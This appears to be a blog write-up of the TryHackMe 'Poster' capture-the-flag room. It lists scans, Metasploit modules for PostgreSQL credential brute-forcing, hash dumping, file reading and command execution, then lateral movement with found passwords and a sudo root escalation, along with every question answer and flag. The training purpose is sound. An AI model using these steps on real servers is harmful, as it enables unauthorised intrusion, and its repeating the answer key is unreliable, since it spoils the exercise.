---
title: "TryHackMe Poster Writeup"
date: 2025-02-01
categories: [TryHackMe]
tags: [Metasploit, postgresql, CTF, Cybersecurity, TryHackMe, Writeup, Walkthrough]
description: My write up for Poster Room on TryHackMe.
image:
  path: /assets/img/posts/2025-02-01-THM-Poster/cover.png
---

# Poster - CTF

## Target Information
- **IP Address**: `10.10.128.66`
![alt text](/assets/img/posts/2025-02-01-THM-Poster/0.png)
## Enumeration

### RustScan
**Command:**  
```bash
rustscan -a 10.10.128.66
```
**Results:**
```
Open 10.10.128.66:22
Open 10.10.128.66:80
Open 10.10.128.66:5432
```

### Nmap
**Command:**  
```bash
nmap -sV -A -p 22,80,5432 10.10.128.66
```
**Results:**  
```
5432/tcp open  postgresql PostgreSQL DB 9.5.8 - 9.5.10 or 9.5.17 - 9.5.23
```

#### Answer to Question 1:
**What is the rdbms installed on the server?:** `PostgreSQL`


#### Answer to Question 2:
**What port is the rdbms running on?:** `5432`

---

## Exploitation

### Metasploit - Enumerate Users
**Command:**
```bash
msfconsole -q
search postgres
```
**Relevant Module:**  
```
auxiliary/scanner/postgres/postgres_login
```

#### Answer to Question 3:
**After starting Metasploit, search for an associated auxiliary module that allows us to enumerate user credentials. What is the full path of the modules (starting with auxiliary)?:** `auxiliary/scanner/postgres/postgres_login`

### Obtaining Credentials
**Command:**  
```bash
use auxiliary/scanner/postgres/postgres_login
set RHOST 10.10.128.66
run
```
**Credentials Found:**  
```
postgres:password
```

#### Answer to Question 4:
**What are the credentials you found?:** `postgres:password`

### Command Execution with Valid Credentials
**Relevant Module:**  
```
auxiliary/admin/postgres/postgres_sql
```

#### Answer to Question 5:
**What is the full path of the module that allows you to execute commands with the proper user credentials (starting with auxiliary)?:** `auxiliary/admin/postgres/postgres_sql`

### RDBMS Version Discovery
After running the `postgres_sql` module, the version retrieved is:

![alt text](/assets/img/posts/2025-02-01-THM-Poster/2.png)
```
9.5.21
```

#### Answer to Question 6:
**Based on the results of #6, what is the rdbms version installed on the server?:** `9.5.21`

### Dumping User Hashes
**Relevant Module:**  
```
auxiliary/scanner/postgres/postgres_hashdump
```

#### Answer to Question 7:
**What is the full path of the module that allows for dumping user hashes (starting with auxiliary)?:** `auxiliary/scanner/postgres/postgres_hashdump`

### Number of User Hashes Dumped
After executing the hash-dump module, retrieved

![alt text](/assets/img/posts/2025-02-01-THM-Poster/1.png)

**6 user hashes**.


#### Answer to Question 8:
- **How many user hashes does the module dump?:** `6`

### Viewing Files on Server
**Relevant Module:**  
```
auxiliary/admin/postgres/postgres_readfile
```

#### Answer to Question 9:
**What is the full path of the module (starting with auxiliary) that allows an authenticated user to view files of their choosing on the server?:** `auxiliary/admin/postgres/postgres_readfile`

### Arbitrary Command Execution
**Relevant Module:**  
```
exploit/multi/postgres/postgres_copy_from_program_cmd_exec
```

#### Answer to Question 10:
**What is the full path of the module that allows arbitrary command execution with the proper user credentials (starting with exploit)?:** `exploit/multi/postgres/postgres_copy_from_program_cmd_exec`

---

## Privilege Escalation

### Finding `user.txt`
1. Gained shell access at `/var/lib/postgresql/9.5/main`
2. Navigated to home directory and found
![alt text](/assets/img/posts/2025-02-01-THM-Poster/3.png)
 `user.txt` in `alison`'s folder.
3. Lacked permission but discovered `credentials.txt` in the `dark` folder.
4. Retrieved **Dark’s password:** `dark:qwerty1234#!hackme`
5. Used SSH to log in as `dark`, ran `linpeas.sh`, and found **Alison’s password** in `/var/www/html/config.php` which is `p4ssw0rdS3cur3!#`.
![alt text](/assets/img/posts/2025-02-01-THM-Poster/4.png)
6. Logged in as `alison` with the password we got and accessed `user.txt`.

#### Answer to Question 11:
**Compromise the machine and locate user.txt:** `THM{postgresql_fa1l_conf1gurat1on}`

### Escalating to Root
1. Logged in as `Alison` and successfully ran:
   ```bash
   sudo su
   ```
2. Retrieved `root.txt` using:
   ```bash
   cat ~root/root.txt
   ```

#### Answer to Question 12:
**Escalate privileges and obtain root.txt :** `THM{c0ngrats_for_read_the_f1le_w1th_credent1als}`